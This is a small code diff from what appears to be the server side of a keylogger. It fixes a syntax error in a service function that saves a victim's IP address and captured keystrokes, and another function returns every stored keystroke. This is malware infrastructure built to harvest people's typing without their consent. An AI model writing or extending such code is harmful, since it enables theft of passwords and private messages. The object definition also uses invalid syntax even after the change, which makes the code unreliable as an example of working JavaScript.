@@ -2,7 +2,7 @@ const keyloggerRepo = require("../repository/keyloggerRepo");
 
 const keyloggerService = {
     saveKeystrokes = postReq => {
-        keyloggerRepo.saveStrokes(postReq.victimIp, postReq.keystrokes
+        keyloggerRepo.saveStrokes(postReq.victimIp, postReq.keystrokes);
     },
     getKeyStrokes = () => {
         return keyloggerRepo.getAllStrokes();
